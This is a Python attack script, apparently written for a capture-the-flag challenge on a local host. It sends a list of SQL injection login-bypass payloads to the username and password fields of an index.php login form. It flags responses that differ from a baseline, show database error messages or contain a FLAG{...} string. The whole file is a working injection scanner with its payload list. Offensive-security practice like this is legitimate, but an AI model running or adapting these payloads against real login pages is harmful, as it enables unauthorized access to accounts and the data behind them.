import requests
import time
from urllib.parse import urljoin

# Target URL
base_url = "http://127.0.0.1:32907"
target_url = urljoin(base_url, "/index.php")

# SQL injection payloads to test
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "admin' #",
    "' OR '1'='1'--",
    "') OR ('1'='1",
    "' OR 'x'='x",
    '") OR ("1"="1',
    "' UNION SELECT NULL--"
]

# Store results
results = []

# Get baseline response (normal failed login)
print("[*] Getting baseline response (normal failed login)...")
baseline_data = {
    'username': 'normaluser',
    'password': 'normalpass'
}

try:
    baseline_response = requests.post(target_url, data=baseline_data, allow_redirects=False, timeout=10)
    baseline_status = baseline_response.status_code
    baseline_length = len(baseline_response.content)
    baseline_cookies = dict(baseline_response.cookies)
    baseline_text = baseline_response.text
    
    print(f"[+] Baseline - Status: {baseline_status} | Length: {baseline_length}B | Cookies: {baseline_cookies}")
    print(f"[+] Baseline response snippet: {baseline_text[:200]}...")
    print()
    
except Exception as e:
    print(f"[-] Error getting baseline: {e}")
    baseline_status = None
    baseline_length = None
    baseline_cookies = {}
    baseline_text = ""

# Test each payload on username field
print("[*] Testing payloads on USERNAME field...")
print("="*100)

for payload in payloads:
    try:
        test_data = {
            'username': payload,
            'password': 'test123'
        }
        
        start_time = time.time()
        response = requests.post(target_url, data=test_data, allow_redirects=False, timeout=10)
        elapsed_time = time.time() - start_time
        
        status = response.status_code
        length = len(response.content)
        cookies = dict(response.cookies)
        response_text = response.text
        
        # Check for differences from baseline
        status_diff = status != baseline_status
        length_diff = abs(length - baseline_length) > 50  # More than 50 bytes difference
        cookies_diff = cookies != baseline_cookies
        
        # Check for SQL error messages
        sql_errors = [
            "SQL syntax",
            "mysql_fetch",
            "mysqli",
            "SQL error",
            "Warning: mysql",
            "PostgreSQL",
            "SQLite",
            "ORA-",
            "Microsoft SQL",
            "ODBC"
        ]
        has_sql_error = any(error.lower() in response_text.lower() for error in sql_errors)
        
        # Check for common success indicators
        success_indicators = [
            "welcome",
            "dashboard",
            "logged in",
            "logout",
            "admin panel",
            "FLAG{"
        ]
        has_success = any(indicator.lower() in response_text.lower() for indicator in success_indicators)
        
        # Store result
        result = {
            'field': 'username',
            'payload': payload,
            'status': status,
            'length': length,
            'time': elapsed_time,
            'cookies': cookies,
            'status_diff': status_diff,
            'length_diff': length_diff,
            'cookies_diff': cookies_diff,
            'sql_error': has_sql_error,
            'success': has_success,
            'response': response_text
        }
        results.append(result)
        
        # Print detailed result
        print(f"\n[TEST] Payload: {payload}")
        print(f"  Status: {status} {'[DIFFERENT]' if status_diff else '[SAME]'}")
        print(f"  Length: {length}B (baseline: {baseline_length}B) {'[DIFFERENT]' if length_diff else '[SAME]'}")
        print(f"  Time: {elapsed_time:.3f}s")
        print(f"  Cookies: {cookies} {'[DIFFERENT]' if cookies_diff else '[SAME]'}")
        print(f"  SQL Error: {'YES' if has_sql_error else 'NO'}")
        print(f"  Success Indicators: {'YES' if has_success else 'NO'}")
        
        if has_sql_error or has_success or status_diff or length_diff or cookies_diff:
            print(f"  [!] INTERESTING - Response differs from baseline!")
            print(f"  Response snippet: {response_text[:300]}")
            
        # Check for flags
        if "FLAG{" in response_text:
            print(f"  [!!!] FLAG FOUND IN RESPONSE!")
            import re
            flags = re.findall(r'FLAG\{[^}]+\}', response_text)
            for flag in flags:
                print(f"  [!!!] FLAG: {flag}")
        
    except Exception as e:
        print(f"\n[ERROR] Payload: {payload}")
        print(f"  Error: {e}")
        results.append({
            'field': 'username',
            'payload': payload,
            'status': 'ERROR',
            'length': 0,
            'time': 0,
            'cookies': {},
            'error': str(e)
        })

# Test each payload on password field
print("\n\n[*] Testing payloads on PASSWORD field...")
print("="*100)

for payload in payloads:
    try:
        test_data = {
            'username': 'admin',
            'password': payload
        }
        
        start_time = time.time()
        response = requests.post(target_url, data=test_data, allow_redirects=False, timeout=10)
        elapsed_time = time.time() - start_time
        
        status = response.status_code
        length = len(response.content)
        cookies = dict(response.cookies)
        response_text = response.text
        
        # Check for differences from baseline
        status_diff = status != baseline_status
        length_diff = abs(length - baseline_length) > 50
        cookies_diff = cookies != baseline_cookies
        
        # Check for SQL error messages
        has_sql_error = any(error.lower() in response_text.lower() for error in sql_errors)
        
        # Check for success indicators
        has_success = any(indicator.lower() in response_text.lower() for indicator in success_indicators)
        
        # Store result
        result = {
            'field': 'password',
            'payload': payload,
            'status': status,
            'length': length,
            'time': elapsed_time,
            'cookies': cookies,
            'status_diff': status_diff,
            'length_diff': length_diff,
            'cookies_diff': cookies_diff,
            'sql_error': has_sql_error,
            'success': has_success,
            'response': response_text
        }
        results.append(result)
        
        # Print detailed result
        print(f"\n[TEST] Payload: {payload}")
        print(f"  Status: {status} {'[DIFFERENT]' if status_diff else '[SAME]'}")
        print(f"  Length: {length}B (baseline: {baseline_length}B) {'[DIFFERENT]' if length_diff else '[SAME]'}")
        print(f"  Time: {elapsed_time:.3f}s")
        print(f"  Cookies: {cookies} {'[DIFFERENT]' if cookies_diff else '[SAME]'}")
        print(f"  SQL Error: {'YES' if has_sql_error else 'NO'}")
        print(f"  Success Indicators: {'YES' if has_success else 'NO'}")
        
        if has_sql_error or has_success or status_diff or length_diff or cookies_diff:
            print(f"  [!] INTERESTING - Response differs from baseline!")
            print(f"  Response snippet: {response_text[:300]}")
            
        # Check for flags
        if "FLAG{" in response_text:
            print(f"  [!!!] FLAG FOUND IN RESPONSE!")
            import re
            flags = re.findall(r'FLAG\{[^}]+\}', response_text)
            for flag in flags:
                print(f"  [!!!] FLAG: {flag}")
        
    except Exception as e:
        print(f"\n[ERROR] Payload: {payload}")
        print(f"  Error: {e}")
        results.append({
            'field': 'password',
            'payload': payload,
            'status': 'ERROR',
            'length': 0,
            'time': 0,
            'cookies': {},
            'error': str(e)
        })

# Print summary table
print("\n\n" + "="*100)
print("[*] SUMMARY TABLE - INTERESTING RESULTS")
print("="*100)

interesting_results = [r for r in results if r.get('status_diff') or r.get('length_diff') or 
                       r.get('cookies_diff') or r.get('sql_error') or r.get('success')]

if interesting_results:
    print(f"\n{'Field':<12} | {'Payload':<25} | {'Status':<8} | {'Length':<8} | {'Time':<8} | {'Anomaly':<30}")
    print("-"*100)
    
    for result in interesting_results:
        anomalies = []
        if result.get('status_diff'):
            anomalies.append('STATUS')
        if result.get('length_diff'):
            anomalies.append('LENGTH')
        if result.get('cookies_diff'):
            anomalies.append('COOKIES')
        if result.get('sql_error'):
            anomalies.append('SQL_ERROR')
        if result.get('success'):
            anomalies.append('SUCCESS')
        
        anomaly_str = ','.join(anomalies)
        payload_short = result['payload'][:25]
        
        print(f"{result['field']:<12} | {payload_short:<25} | {str(result['status']):<8} | "
              f"{result['length']:<8} | {result.get('time', 0):.3f}s   | {anomaly_str:<30}")
else:
    print("\n[*] No interesting results found. All responses similar to baseline.")

# Print all results table
print("\n\n" + "="*100)
print("[*] ALL RESULTS TABLE")
print("="*100)
print(f"\n{'Field':<12} | {'Payload':<25} | {'Status':<8} | {'Length':<10} | {'Time':<10} | {'Cookies':<15}")
print("-"*100)

for result in results:
    if result['status'] != 'ERROR':
        payload_short = result['payload'][:25]
        cookies_str = 'Yes' if result.get('cookies') else 'No'
        print(f"{result['field']:<12} | {payload_short:<25} | {result['status']:<8} | "
              f"{result['length']:<10} | {result['time']:.3f}s     | {cookies_str:<15}")

print("\n[*] Testing complete!")

